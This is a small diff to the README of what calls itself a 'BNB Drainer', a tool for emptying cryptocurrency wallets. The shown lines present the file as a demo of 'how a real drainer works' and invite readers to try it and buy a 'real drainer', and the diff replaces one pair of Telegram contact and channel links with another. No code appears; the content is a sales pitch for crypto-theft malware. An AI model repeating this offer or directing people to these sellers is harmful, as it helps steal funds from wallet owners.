@@ -2,8 +2,8 @@
 NOTE: This is just a demo script, to demonstrate how a real drainer works, it's easily detected,
 	 so try it out, and get a real drainer at :
 
-- **✉ Contact: https://t.me/PSwTD** 
-- **👥 Channel: https://t.me/cryptohackers1402** 
+- **✉ Contact: https://t.me/Pent_Ai** 
+- **👥 Channel: https://t.me/SwapTD** 
 
 How to use the BNB Drainer:
 
